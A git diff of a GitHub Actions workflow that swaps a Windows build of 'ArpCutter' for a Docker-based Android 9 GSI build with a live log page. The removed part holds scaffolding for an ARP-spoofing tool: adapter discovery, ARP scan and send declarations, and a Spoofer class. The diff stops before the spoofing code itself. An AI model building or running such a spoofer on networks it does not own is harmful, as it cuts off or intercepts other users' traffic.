@@ -1,1791 +1,312 @@
-name: Build ArpCutter
+name: Build Nivi (AOSP 9 GSI)
 
 on:
-  push:
-    branches: [ main ]
-  schedule:
-    - cron: '0 18 * * *'      # 01:00 sang gio Viet Nam, build lai moi ngay
   workflow_dispatch:
+    inputs:
+      disable_dexpreopt:
+        description: 'Chi dexpreopt boot image + system_server (nhe hon, tiet kiem dia/thoi gian; APK dung dexpreopt it hon). Khong tat han dexpreopt vi Android 9 userdebug bat buoc'
+        type: boolean
+        default: false
+      free_repo_dir:
+        description: 'Xoa thu muc .repo (lich su git) sau khi sync de tiet kiem nhieu GB dia. Tat neu build bao loi lien quan toi git'
+        type: boolean
+        default: true
 
 permissions:
-  contents: write
+  contents: write                 # de day trang log len nhanh gh-pages
 
-concurrency:
-  group: build-${{ github.ref }}
-  cancel-in-progress: true
+env:
+  CACHE_KEY: ccache-nivi-${{ github.run_id }}   # moi lan chay 1 key moi, restore lay ban moi nhat
 
 jobs:
   build:
-    runs-on: windows-latest
-    timeout-minutes: 30
-
+    runs-on: ubuntu-22.04
+    timeout-minutes: 355          # gioi han cua GitHub la 360 phut / job
+    env:
+      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
+      # Giai phong dia + gop 2 phan vung bang LVM, mount vao /build
+      - name: Maximize build space
+        uses: easimon/maximize-build-space@master
+        with:
+          build-mount-path: /build
+          root-reserve-mb: 1024
+          temp-reserve-mb: 100
+          swap-size-mb: 4096
+          remove-dotnet: 'true'
+          remove-android: 'true'
+          remove-haskell: 'true'
+          remove-codeql: 'true'
+          remove-docker-images: 'true'
 
-      - name: Dong bo gio he thong
-        continue-on-error: true
-        shell: pwsh
+      - name: Disk / CPU / RAM
         run: |
-          try { Start-Service w32time -ErrorAction Stop } catch { Write-Host $_.Exception.Message }
-          w32tm /resync /force
-          Get-Date
+          sudo chown -R "$USER":"$USER" /build
+          df -h / /build /mnt || true
+          nproc; free -g
 
-      - name: Sinh version.h + common.hpp + util.cpp
-        id: build
-        shell: pwsh
+      # Lay lai ccache cua cac lan chay truoc (neu co)
+      - name: Restore ccache
+        uses: actions/cache/restore@v4
+        with:
+          path: /build/ccache
+          key: ${{ env.CACHE_KEY }}
+          restore-keys: |
+            ccache-nivi-
+
+      - name: Viet script trang log (publish.sh)
         run: |
-          $ErrorActionPreference = 'Stop'
-          $ProgressPreference    = 'SilentlyContinue'
+          cat > /build/publish.sh <<'PUB_EOF'
+          #!/bin/bash
+          # Moi lan goi: day log.txt len nhanh "logs" (khong kich hoat deploy Pages).
+          # Trang index.html (chi day 1 lan len gh-pages) tu doc log.txt qua API moi 60 giay.
+          # Loi o day khong duoc lam hong build.
+          REMOTE="${REMOTE_URL:-https://x-access-token:${GITHUB_TOKEN}@github.com/${GITHUB_REPOSITORY}.git}"
+          REPO="${GITHUB_REPOSITORY:-owner/repo}"
+          PROG=$(grep -o '\[ *[0-9]*% [0-9]*/[0-9]*\]' /build/make_full.log 2>/dev/null | tail -1)
+          DISK=$(df -h /build | tail -1 | awk '{print $3 " dung / " $4 " trong"}')
 
-          $ver  = "1.0.${{ github.run_number }}"
-          $date = (Get-Date).ToUniversalTime().AddHours(7).ToString('yyyy-MM-dd')
-          "VER=$ver"   >> $env:GITHUB_OUTPUT
-          "DATE=$date" >> $env:GITHUB_OUTPUT
+          L=/tmp/logrepo
+          mkdir -p "$L" && cd "$L" || exit 0
+          [ -d .git ] || { git init -q && git checkout -q -b logs; }
+          git config user.name "nivi-bot"; git config user.email "nivi-bot@localhost"
+          {
+            echo "cap nhat : $(date -u '+%F %T') UTC"
+            echo "tien do  : ${PROG:-chua bat dau make}"
+            echo "dia      : ${DISK}"
+            echo "-------------------------------------------"
+            tail -n 250 /build/ci_last.log 2>/dev/null
+          } > log.txt
+          git add -A
+          git commit -q -m "log $(date -u +%H:%M:%S)" 2>/dev/null || true
+          git push -q -f "$REMOTE" logs 2>&1 | tail -1 || true
 
-          New-Item -ItemType Directory -Force -Path src | Out-Null
-
-          @(
-            "#pragma once",
-            "#define APP_VERSION `"$ver`"",
-            "#define BUILD_DATE  `"$date`"",
-            "#define GH_OWNER    `"${{ github.repository_owner }}`"",
-            "#define GH_REPO     `"${{ github.event.repository.name }}`""
-          ) | Set-Content -Encoding utf8 src/version.h
-
-          @'
-          // common.hpp
-          #pragma once
-
-          #define WIN32_LEAN_AND_MEAN
-          #include <winsock2.h>
-          #include <ws2tcpip.h>
-          #include <windows.h>
-          #include <cstdint>
-          #include <cstring>
-          #include <cstdio>
-          #include <cstdlib>
-          #include <cctype>
-          #include <string>
-          #include <vector>
-          #include <map>
-          #include <algorithm>
-          #include <mutex>
-          #include <atomic>
-          #include <thread>
-          #include <ctime>
-
-          #if defined(__has_include)
-          #  if __has_include("version.h")
-          #    include "version.h"
-          #  endif
-          #endif
-
-          #ifndef APP_VERSION
-          #  define APP_VERSION "1.0.0-dev"
-          #endif
-          #ifndef BUILD_DATE
-          #  define BUILD_DATE  "dev"
-          #endif
-          #ifndef GH_OWNER
-          #  define GH_OWNER    "your-github-user"
-          #endif
-          #ifndef GH_REPO
-          #  define GH_REPO     "arpcutter"
-          #endif
-
-          struct Mac {
-              uint8_t b[6]{};
-              bool zero()  const { for (int i = 0; i < 6; i++) if (b[i]) return false; return true; }
-              bool valid() const { return !zero(); }
-              bool bcast() const { for (int i = 0; i < 6; i++) if (b[i] != 0xFF) return false; return true; }
-              std::string str() const;
-              std::string win() const;
-              static Mac parse(const std::string& s);
-              bool operator==(const Mac& o) const { return memcmp(b, o.b, 6) == 0; }
-              bool operator!=(const Mac& o) const { return !(*this == o); }
-          };
-
-          struct Device {
-              std::string mac;
-              std::string ip;
-              std::string name;
-              std::string first;
-              std::string last;
-              int  seen = 0;
-              bool isNew = false;
-          };
-
-          std::string  nowStamp();
-          std::string  todayStr();
-          uint32_t     ipToU32(const std::string& ip);
-          std::string  u32ToIp(uint32_t ip);
-          std::wstring toWide(const std::string& s);
-          std::string  toNarrow(const std::wstring& s);
-          std::string  dataDir();
-          std::string  exePath();
-          bool         isAdmin();
-          void         logLine(const std::string& tag, const std::string& msg);
-          std::string  runCapture(const std::string& cmd);
-          std::string  readFile(const std::string& path);
-          bool         writeFile(const std::string& path, const std::string& data);
-          bool         fileExists(const std::string& path);
-          '@ | Set-Content -Encoding utf8 src/common.hpp
-
-          @'
-          // util.cpp
-          #include "common.hpp"
-          #include <shlobj.h>
-          #include <iostream>
-
-          #pragma comment(lib, "shell32.lib")
-          #pragma comment(lib, "advapi32.lib")
-          #pragma comment(lib, "ws2_32.lib")
-
-          static std::mutex g_logMtx;
-
-          std::string Mac::str() const {
-              char buf[32];
-              sprintf_s(buf, "%02X:%02X:%02X:%02X:%02X:%02X",
-                        b[0], b[1], b[2], b[3], b[4], b[5]);
-              return buf;
+          if [ ! -f /tmp/pages_done ]; then
+            P=/tmp/pages
+            mkdir -p "$P" && cd "$P" || exit 0
+            [ -d .git ] || { git init -q && git checkout -q -b gh-pages; }
+            git config user.name "nivi-bot"; git config user.email "nivi-bot@localhost"
+            cat > index.html <<'HTML'
+          <!doctype html><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+          <title>Nivi build log</title>
+          <body style="font:13px/1.4 monospace;background:#111;color:#ddd;margin:0;padding:12px">
+          <b>Nivi build</b> &middot; <span id="st">dang tai...</span> &middot; <a href="#" id="rl" style="color:#8cf">tai lai ngay</a>
+          <pre id="log" style="white-space:pre-wrap;word-break:break-all;margin-top:10px"></pre>
+          <script>
+          var REPO='__REPO__';
+          function tick(){
+            fetch('https://api.github.com/repos/'+REPO+'/contents/log.txt?ref=logs',{headers:{'Accept':'application/vnd.github.raw+json'},cache:'no-store'})
+              .then(function(r){ if(!r.ok) throw new Error('HTTP '+r.status); return r.text(); })
+              .then(function(t){ document.getElementById('log').textContent=t; document.getElementById('st').textContent='da tai luc '+new Date().toLocaleTimeString()+' (tu dong moi 60s)'; })
+              .catch(function(e){ document.getElementById('st').textContent='loi: '+e.message+' - se thu lai'; });
           }
+          document.getElementById('rl').onclick=function(e){ e.preventDefault(); tick(); };
+          tick(); setInterval(tick,60000);
+          </script>
+          HTML
+            sed -i "s#__REPO__#${REPO}#" index.html
+            touch .nojekyll
+            git add -A
+            git commit -q -m "page" 2>/dev/null || true
+            git push -q -f "$REMOTE" gh-pages 2>&1 | tail -1 && touch /tmp/pages_done
+          fi
+          exit 0
+          PUB_EOF
+          chmod +x /build/publish.sh
+          touch /build/ci_last.log
+          /build/publish.sh || true      # tao trang ngay tu dau
 
-          std::string Mac::win() const {
-              char buf[32];
-              sprintf_s(buf, "%02X-%02X-%02X-%02X-%02X-%02X",
-                        b[0], b[1], b[2], b[3], b[4], b[5]);
-              return buf;
-          }
-
-          Mac Mac::parse(const std::string& s) {
-              Mac m;
-              std::string t;
-              for (char c : s) if (isxdigit((unsigned char)c)) t += c;
-              if (t.size() < 12) return m;
-              for (int i = 0; i < 6; i++)
-                  m.b[i] = (uint8_t)strtol(t.substr(i * 2, 2).c_str(), nullptr, 16);
-              return m;
-          }
-
-          std::string nowStamp() {
-              time_t t = time(nullptr);
-              tm lt{};
-              localtime_s(&lt, &t);
-              char b[40];
-              strftime(b, sizeof(b), "%Y-%m-%d %H:%M:%S", &lt);
-              return b;
-          }
-
-          std::string todayStr() {
-              time_t t = time(nullptr);
-              tm lt{};
-              localtime_s(&lt, &t);
-              char b[16];
-              strftime(b, sizeof(b), "%Y-%m-%d", &lt);
-              return b;
-          }
-
-          uint32_t ipToU32(const std::string& ip) {
-              in_addr a{};
-              if (inet_pton(AF_INET, ip.c_str(), &a) != 1) return 0;
-              return ntohl(a.s_addr);
-          }
-
-          std::string u32ToIp(uint32_t v) {
-              in_addr a{};
-              a.s_addr = htonl(v);
-              char b[32]{};
-              inet_ntop(AF_INET, &a, b, sizeof(b));
-              return b;
-          }
-
-          std::wstring toWide(const std::string& s) {
-              if (s.empty()) return L"";
-              int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), nullptr, 0);
-              std::wstring w(n, L'\0');
-              MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &w[0], n);
-              return w;
-          }
-
-          std::string toNarrow(const std::wstring& w) {
-              if (w.empty()) return "";
-              int n = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(),
-                                          nullptr, 0, nullptr, nullptr);
-              std::string s(n, '\0');
-              WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), &s[0], n, nullptr, nullptr);
-              return s;
-          }
-
-          std::string dataDir() {
-              static std::string cached;
-              if (!cached.empty()) return cached;
-              char buf[MAX_PATH]{};
-              std::string d;
-              if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, buf)))
-                  d = buf;
-              else
-                  d = ".";
-              d += "\\ArpCutter";
-              CreateDirectoryA(d.c_str(), nullptr);
-              cached = d;
-              return cached;
-          }
-
-          std::string exePath() {
-              char buf[MAX_PATH * 2]{};
-              GetModuleFileNameA(nullptr, buf, sizeof(buf));
-              return buf;
-          }
-
-          bool isAdmin() {
-              BOOL res = FALSE;
-              SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
-              PSID sid = nullptr;
-              if (AllocateAndInitializeSid(&nt, 2, SECURITY_BUILTIN_DOMAIN_RID,
-                                           DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &sid)) {
-                  CheckTokenMembership(nullptr, sid, &res);
-                  FreeSid(sid);
-              }
-              return res != FALSE;
-          }
-
-          static WORD colorFor(const std::string& tag) {
-              if (tag == "OK")   return 10;
-              if (tag == "WARN") return 14;
-              if (tag == "ERR")  return 12;
-              if (tag == "ARP")  return 11;
-              if (tag == "NET")  return 13;
-              return 7;
-          }
-
-          void logLine(const std::string& tag, const std::string& msg) {
-              std::lock_guard<std::mutex> lk(g_logMtx);
-              HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
-              CONSOLE_SCREEN_BUFFER_INFO ci{};
-              WORD old = 7;
-              if (GetConsoleScreenBufferInfo(h, &ci)) old = ci.wAttributes;
-              SetConsoleTextAttribute(h, colorFor(tag));
-              std::string line = "[" + nowStamp() + "] [" + tag + "] " + msg;
-              std::cout << line << std::endl;
-              SetConsoleTextAttribute(h, old);
-
-              FILE* f = fopen((dataDir() + "\\arpcutter.log").c_str(), "a");
-              if (f) { fprintf(f, "%s\n", line.c_str()); fclose(f); }
-          }
-
-          std::string runCapture(const std::string& cmd) {
-              std::string out;
-              FILE* f = _popen(cmd.c_str(), "r");
-              if (!f) return out;
-              char buf[1024];
-              while (fgets(buf, sizeof(buf), f)) out += buf;
-              _pclose(f);
-              return out;
-          }
-
-          std::string readFile(const std::string& path) {
-              FILE* f = fopen(path.c_str(), "rb");
-              if (!f) return "";
-              fseek(f, 0, SEEK_END);
-              long n = ftell(f);
-              fseek(f, 0, SEEK_SET);
-              std::string s(n > 0 ? (size_t)n : 0, '\0');
-              if (n > 0) fread(&s[0], 1, (size_t)n, f);
-              fclose(f);
-              return s;
-          }
-
-          bool writeFile(const std::string& path, const std::string& data) {
-              FILE* f = fopen(path.c_str(), "wb");
-              if (!f) return false;
-              if (!data.empty()) fwrite(data.data(), 1, data.size(), f);
-              fclose(f);
-              return true;
-          }
-
-          bool fileExists(const std::string& path) {
-              DWORD a = GetFileAttributesA(path.c_str());
-              return a != INVALID_FILE_ATTRIBUTES && !(a & FILE_ATTRIBUTE_DIRECTORY);
-          }
-          '@ | Set-Content -Encoding utf8 src/util.cpp
-
-      - name: Sinh net.hpp + net.cpp
-        shell: pwsh
+      - name: Viet script build
         run: |
-          $ErrorActionPreference = 'Stop'
+          cat > /build/build.sh <<'BUILD_EOF'
+          #!/bin/bash
+          # Chay TRONG container ubuntu:18.04, thu muc lam viec /build
+          set -e
+          export DEBIAN_FRONTEND=noninteractive
+          TAG="android-9.0.0_r61"
+          TARGET="aosp_arm64_ab-userdebug"      # may A-only: aosp_arm64_a-userdebug
+          PRODUCT_DIR="generic_arm64_ab"        # may A-only: generic_arm64_a
+          JOBS="${JOBS:-4}"
 
-          @'
-          // net.hpp
-          #pragma once
-          #include "common.hpp"
-          #include <pcap.h>
+          echo "[1] Cai goi (Ubuntu 18.04)"
+          apt-get update -qq
+          apt-get install -y -qq git-core gnupg flex bison build-essential zip curl zlib1g-dev \
+            gcc-multilib g++-multilib libc6-dev-i386 lib32ncurses5-dev x11proto-core-dev \
+            libx11-dev lib32z1-dev libgl1-mesa-dev libxml2-utils xsltproc unzip fontconfig \
+            python openjdk-8-jdk bc rsync libssl-dev lzop schedtool locales ca-certificates \
+            python3 file ccache
+          locale-gen en_US.UTF-8
+          export LANG=en_US.UTF-8 LC_ALL=en_US.UTF-8
+          python --version
+          java -version 2>&1 | head -1
 
-          struct Adapter {
-              int         idx = 0;
-              std::string devName;
-              std::string desc;
-              std::string ip;
-              std::string mask;
-              Mac         mac;
-          };
+          # ccache luu o /build/ccache (duoc cache giua cac lan chay)
+          export USE_CCACHE=1 CCACHE_EXEC=/usr/bin/ccache CCACHE_DIR=/build/ccache
+          export CCACHE_COMPRESS=1 CCACHE_MAXSIZE=7G
+          mkdir -p "$CCACHE_DIR"
+          ccache -M 7G || true
+          ccache -s | head -5 || true
 
-          std::vector<Adapter> listAdapters();
-          int      pickAdapterIndex(const std::vector<Adapter>& list, int forced);
-          pcap_t*  openAdapter(const Adapter& a);
-          uint32_t defaultGateway(const std::string& localIp);
-          void     printAdapters(const std::vector<Adapter>& list);
-          '@ | Set-Content -Encoding utf8 src/net.hpp
+          git config --global user.name "nivi"
+          git config --global user.email "nivi@localhost"
+          git config --global color.ui false
+          curl -s https://storage.googleapis.com/git-repo-downloads/repo -o /usr/local/bin/repo
+          chmod +x /usr/local/bin/repo
 
-          @'
-          // net.cpp
-          #include "net.hpp"
-          #include <iphlpapi.h>
-          #include <iostream>
+          mkdir -p /build/src && cd /build/src
+          if [ ! -d .repo ]; then
+            echo "[2] repo init $TAG"
+            repo init -q -u https://android.googlesource.com/platform/manifest -b "$TAG" --depth=1 --no-clone-bundle
+          fi
+          echo "[3] repo sync"
+          repo sync -q -c -j"$JOBS" --force-sync --no-clone-bundle --no-tags --optimized-fetch --prune \
+            || repo sync -q -c -j2 --force-sync --no-clone-bundle --no-tags
+          echo "[3b] Don dep: xoa thu muc chi dung cho macOS / khong can cho GSI (tiet kiem dia)"
+          BEFORE=$(df -m /build | tail -1 | awk '{print $3}')
+          find prebuilts -maxdepth 5 -type d \( -name 'darwin-x86' -o -name 'darwin-x86_64' -o -name 'darwin-arm64' \) -prune -exec rm -rf {} + 2>/dev/null || true
+          rm -rf prebuilts/android-emulator 2>/dev/null || true
+          AFTER=$(df -m /build | tail -1 | awk '{print $3}')
+          echo "[3b] giai phong khoang $((BEFORE-AFTER)) MB"
+          df -h /build | tail -1
 
-          #pragma comment(lib, "iphlpapi.lib")
-          #pragma comment(lib, "ws2_32.lib")
+          if [ "${FREE_REPO:-true}" = "true" ]; then
+            echo "[3c] Xoa .repo (lich su git) de tiet kiem dia. Kich thuoc truoc khi xoa:"
+            du -sh .repo 2>/dev/null || true
+            B2=$(df -m /build | tail -1 | awk '{print $3}')
+            rm -rf .repo
+            A2=$(df -m /build | tail -1 | awk '{print $3}')
+            echo "[3c] giai phong khoang $((B2-A2)) MB"
+            df -h /build | tail -1
+          fi
 
-          std::vector<Adapter> listAdapters() {
-              std::vector<Adapter> out;
-              ULONG sz = 32 * 1024;
-              std::vector<BYTE> buf(sz);
+          echo "[4] Prop Nivi"
+          mkdir -p vendor/nivi
+          cat > vendor/nivi/nivi.mk <<'MK'
+          PRODUCT_PROPERTY_OVERRIDES += \
+              ro.nivi.version=1.0 \
+              persist.sys.use_dithering=0 \
+              debug.sf.hw=1 \
+              debug.egl.hw=1 \
+              debug.performance.tuning=1 \
+              video.accelerate.hw=1 \
+              windowsmgr.max_events_per_sec=150 \
+              ro.min_pointer_dur=8 \
+              ro.max.fling_velocity=12000 \
+              ro.min.fling_velocity=8000 \
+              persist.sys.scrollingcache=3 \
+              pm.sleep_mode=1 \
+              wifi.supplicant_scan_interval=180 \
+              dalvik.vm.heapgrowthlimit=256m \
+              dalvik.vm.heapsize=512m \
+              dalvik.vm.heapminfree=4m \
+              dalvik.vm.heapstartsize=16m \
+              dalvik.vm.dex2oat-filter=speed \
+              dalvik.vm.image-dex2oat-filter=speed \
+              ro.sys.fw.bg_apps_limit=64 \
+              persist.sys.nivi.gamemode=1
+          MK
+          if [ "${NO_DEXPREOPT:-false}" = "true" ]; then
+            echo "[4] Che do nhe: chi dexpreopt boot image + system_server (van bat dexpreopt, userdebug yeu cau)"
+            printf 'WITH_DEXPREOPT := true\nWITH_DEXPREOPT_BOOT_IMG_AND_SYSTEM_SERVER_ONLY := true\n' >> vendor/nivi/nivi.mk
+          fi
+          MK_FILE="build/make/target/product/$(echo "$TARGET" | cut -d- -f1).mk"
+          grep -q nivi.mk "$MK_FILE" || echo '$(call inherit-product, vendor/nivi/nivi.mk)' >> "$MK_FILE"
 
-              ULONG r = GetAdaptersAddresses(
-                  AF_INET,
-                  GAA_FLAG_INCLUDE_GATEWAYS | GAA_FLAG_SKIP_ANYCAST |
-                  GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_DNS_SERVER,
-                  nullptr, (IP_ADAPTER_ADDRESSES*)buf.data(), &sz);
+          echo "[5] Build"
+          export ALLOW_MISSING_DEPENDENCIES=true BUILD_BROKEN_DUP_RULES=true
+          export BUILD_NUMBER="nivi.$(date +%Y%m%d)" BUILD_DISPLAY_ID="Nivi-1.0"
+          export _JAVA_OPTIONS="-Xmx3g"
+          source build/envsetup.sh
+          lunch "$TARGET"
+          # Log day du -> /build/make_full.log ; man hinh chi in moi 300 dong + dong loi
+          set +e
+          T0=$(date +%s)
+          nice -n 10 make -j"$JOBS" systemimage 2>&1 | tee /build/make_full.log | awk 'NR%300==0 || /FAILED|error:|Error [0-9]|No space/ {print; fflush()}'
+          set -e
+          ccache -s | head -8 || true
 
-              if (r == ERROR_BUFFER_OVERFLOW) {
-                  buf.resize(sz);
-                  r = GetAdaptersAddresses(
-                      AF_INET,
-                      GAA_FLAG_INCLUDE_GATEWAYS | GAA_FLAG_SKIP_ANYCAST |
-                      GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_DNS_SERVER,
-                      nullptr, (IP_ADAPTER_ADDRESSES*)buf.data(), &sz);
-              }
-              if (r != NO_ERROR) {
-                  logLine("ERR", "GetAdaptersAddresses loi: " + std::to_string(r));
-                  return out;
-              }
+          # Neu loi: in LOI DAU TIEN (kem 40 dong sau) ra man hinh de trang log hien du chi tiet
+          if [ ! -f "out/target/product/$PRODUCT_DIR/system.img" ]; then
+            echo "================ LOI DAU TIEN (FAILED) ================"
+            grep -n -m1 -B1 -A40 'FAILED:' /build/make_full.log 2>/dev/null | cut -c1-600 || true
+            echo "================ HET LOI DAU TIEN ================"
+            echo "[tien do cuoi] $(grep -o '\[ *[0-9]*% [0-9]*/[0-9]*\]' /build/make_full.log 2>/dev/null | tail -1)"
+            echo "[thoi gian chay] $(( ($(date +%s) - T0) / 60 )) phut (gioi han 330)"
+            df -h /build | tail -1
+            echo "---- 30 dong cuoi make_full.log ----"
+            tail -n 30 /build/make_full.log 2>/dev/null | cut -c1-400
+            echo "---- tim killed/OOM/timeout/signal ----"
+            grep -n -i -m10 'killed\|out of memory\|oom\|signal\|cancel\|terminated\|panic\|fatal' /build/make_full.log 2>/dev/null | cut -c1-400
+            echo "---- soong log ----"
+            tail -n 20 out/soong.log 2>/dev/null | cut -c1-400
+            tail -n 20 out/verbose.log.gz 2>/dev/null | head -0
+            echo "---- error.log ----"
+            tail -n 40 out/error.log 2>/dev/null | cut -c1-400
+          fi
 
-              int idx = 0;
-              for (auto* a = (IP_ADAPTER_ADDRESSES*)buf.data(); a; a = a->Next) {
-                  if (a->OperStatus != IfOperStatusUp) continue;
-                  if (a->IfType == IF_TYPE_SOFTWARE_LOOPBACK) continue;
-                  if (a->PhysicalAddressLength != 6) continue;
+          IMG="out/target/product/$PRODUCT_DIR/system.img"
+          if [ -f "$IMG" ]; then
+            mkdir -p /build/out_nivi
+            cp "$IMG" /build/out_nivi/Nivi-system.img
+            echo "DONE: /build/out_nivi/Nivi-system.img"
+          else
+            echo "KHONG co system.img - build chua xong hoac loi (ccache da luu, chay lai de tiep tuc)"; exit 1
+          fi
+          BUILD_EOF
 
-                  Adapter ad;
-                  ad.idx  = ++idx;
-                  ad.desc = a->Description ? toNarrow(a->Description) : "?";
-                  memcpy(ad.mac.b, a->PhysicalAddress, 6);
-
-                  for (auto* ua = a->FirstUnicastAddress; ua; ua = ua->Next) {
-                      if (ua->Address.lpSockaddr->sa_family != AF_INET) continue;
-                      auto* sin = (sockaddr_in*)ua->Address.lpSockaddr;
-                      ad.ip = u32ToIp(ntohl(sin->sin_addr.s_addr));
-                      if (ua->OnLinkPrefixLength > 0 && ua->OnLinkPrefixLength <= 32) {
-                          uint32_t m = (ua->OnLinkPrefixLength == 32)
-                                       ? 0xFFFFFFFFu
-                                       : (0xFFFFFFFFu << (32 - ua->OnLinkPrefixLength));
-                          ad.mask = u32ToIp(m);
-                      }
-                      break;
-                  }
-                  if (ad.ip.empty() || ad.ip == "0.0.0.0") continue;
-                  if (ad.ip.rfind("169.254.", 0) == 0) continue;
-                  out.push_back(ad);
-              }
-
-              pcap_if_t* devs = nullptr;
-              char err[PCAP_ERRBUF_SIZE]{};
-              if (pcap_findalldevs(&devs, err) == 0) {
-                  for (auto* d = devs; d; d = d->next) {
-                      for (auto* ad = d->addresses; ad; ad = ad->next) {
-                          if (!ad->addr || ad->addr->sa_family != AF_INET) continue;
-                          auto* sin = (sockaddr_in*)ad->addr;
-                          std::string ip = u32ToIp(ntohl(sin->sin_addr.s_addr));
-                          for (auto& x : out) {
-                              if (x.devName.empty() && x.ip == ip) {
-                                  x.devName = d->name;
-                                  if (d->description && x.desc.empty())
-                                      x.desc = d->description;
-                              }
-                          }
-                      }
-                  }
-                  pcap_freealldevs(devs);
-              }
-
-              out.erase(std::remove_if(out.begin(), out.end(),
-                        [](const Adapter& a) { return a.devName.empty(); }), out.end());
-              return out;
-          }
-
-          int pickAdapterIndex(const std::vector<Adapter>& list, int forced) {
-              if (list.empty()) return -1;
-              if (forced > 0) {
-                  for (size_t i = 0; i < list.size(); i++)
-                      if (list[i].idx == forced) return (int)i;
-              }
-              for (size_t i = 0; i < list.size(); i++)
-                  if (list[i].ip.rfind("192.168.1.", 0) == 0) return (int)i;
-              return 0;
-          }
-
-          pcap_t* openAdapter(const Adapter& a) {
-              char err[PCAP_ERRBUF_SIZE]{};
-              pcap_t* h = pcap_open_live(a.devName.c_str(), 65536, 1, 80, err);
-              if (!h) {
-                  logLine("ERR", std::string("pcap_open_live that bai: ") + err);
-                  logLine("ERR", "Da cai Npcap chua? Tai tai https://npcap.com/#download");
-                  return nullptr;
-              }
-              return h;
-          }
-
-          uint32_t defaultGateway(const std::string& localIp) {
-              ULONG sz = 32 * 1024;
-              std::vector<BYTE> buf(sz);
-              ULONG r = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_GATEWAYS,
-                                             nullptr, (IP_ADAPTER_ADDRESSES*)buf.data(), &sz);
-              if (r == ERROR_BUFFER_OVERFLOW) {
-                  buf.resize(sz);
-                  r = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_GATEWAYS,
-                                           nullptr, (IP_ADAPTER_ADDRESSES*)buf.data(), &sz);
-              }
-              if (r != NO_ERROR) return 0;
-
-              for (auto* a = (IP_ADAPTER_ADDRESSES*)buf.data(); a; a = a->Next) {
-                  std::string ip;
-                  for (auto* ua = a->FirstUnicastAddress; ua; ua = ua->Next) {
-                      if (ua->Address.lpSockaddr->sa_family != AF_INET) continue;
-                      auto* sin = (sockaddr_in*)ua->Address.lpSockaddr;
-                      ip = u32ToIp(ntohl(sin->sin_addr.s_addr));
-                      break;
-                  }
-                  if (!localIp.empty() && ip != localIp) continue;
-                  for (auto* g = a->FirstGatewayAddress; g; g = g->Next) {
-                      if (g->Address.lpSockaddr->sa_family != AF_INET) continue;
-                      auto* sin = (sockaddr_in*)g->Address.lpSockaddr;
-                      uint32_t gw = ntohl(sin->sin_addr.s_addr);
-                      if (gw) return gw;
-                  }
-              }
-              return 0;
-          }
-
-          void printAdapters(const std::vector<Adapter>& list) {
-              std::cout << "\n--- Card mang kha dung ---\n";
-              for (size_t i = 0; i < list.size(); i++) {
-                  printf("  #%d  ip=%-16s mac=%-18s  %s\n",
-                         list[i].idx, list[i].ip.c_str(), list[i].mac.str().c_str(),
-                         list[i].desc.c_str());
-              }
-              std::cout << "\n";
-          }
-          '@ | Set-Content -Encoding utf8 src/net.cpp
-
-      - name: Sinh arp.hpp + arp.cpp
-        shell: pwsh
+      - name: Build AOSP trong Docker ubuntu:18.04
         run: |
-          $ErrorActionPreference = 'Stop'
+          # Vong lap day log moi 30 giay (trang web doc lai moi 60 giay)
+          ( while true; do sleep 30; /build/publish.sh; done ) &
+          HB=$!
+          # Het gio thi tu dung truoc khi GitHub cat (de con thoi gian luu cache + upload)
+          # Gioi han tai nguyen container de runner khong bi "bo doi" (mat ket noi voi GitHub)
+          JOBS_N=$(( $(nproc) > 3 ? $(nproc) - 1 : $(nproc) ))
+            # patchoat/dex2oat (ART cua Android 9) can dia chi mmap co dinh -> tat ASLR (host dung chung kernel voi container)
+          sudo sysctl -w kernel.randomize_va_space=0 || true
+          docker run --rm --security-opt seccomp=unconfined \
+            --memory=14g --memory-swap=18g --cpus="$JOBS_N" \
+            -v /build:/build \
+            -e JOBS="$JOBS_N" \
+            -e NO_DEXPREOPT="${{ inputs.disable_dexpreopt }}" \
+            -e FREE_REPO="${{ inputs.free_repo_dir }}" \
+            ubuntu:18.04 \
+            bash -lc "timeout 330m setarch x86_64 -R bash /build/build.sh" 2>&1 | tee /build/ci_last.log || true
+          kill "$HB" 2>/dev/null || true
 
-          @'
-          // arp.hpp
-          #pragma once
-          #include "common.hpp"
-          #include <pcap.h>
-
-          #pragma pack(push, 1)
-          struct EthHdr { uint8_t dst[6]; uint8_t src[6]; uint16_t type; };
-          struct ArpHdr {
-              uint16_t htype, ptype;
-              uint8_t  hlen, plen;
-              uint16_t op;
-              uint8_t  sha[6];
-              uint32_t spa;
-              uint8_t  tha[6];
-              uint32_t tpa;
-          };
-          #pragma pack(pop)
-
-          #define ETH_ARP    0x0806
-          #define ARP_REQ    1
-          #define ARP_REPLY  2
-
-          void arpSend(pcap_t* h, uint16_t op, const Mac& sha, uint32_t spa,
-                       const Mac& tha, uint32_t tpa);
-
-          bool arpResolve(pcap_t* h, const Mac& myMac, uint32_t myIp,
-                          uint32_t targetIp, Mac& outMac, int timeoutMs = 1200);
-
-          int  arpScan(pcap_t* h, const Mac& myMac, uint32_t myIp, uint32_t mask,
-                       std::vector<Device>& out, int totalMs = 6000, bool withNames = true);
-
-          class Spoofer {
-          public:
-              struct T { uint32_t ip; Mac mac; };
-
-              pcap_t*  h = nullptr;
-              Mac      myMac, gwMac;
-              uint32_t myIp = 0, gwIp = 0;
-              bool     bothWay = false;
-              std::vector<T> t_;
-
-              void add(uint32_t ip, const Mac& m);
-              void start();
-              void stop();
-              void restore();
-
-          private:
-              std::atomic<bool> run_{ false };
-              std::thread       th_;
-              void loop();
-          };
-          '@ | Set-Content -Encoding utf8 src/arp.hpp
-
-          @'
-          // arp.cpp
-          #include "arp.hpp"
-          #include <iostream>
-
-          static std::mutex g_txMtx;
-
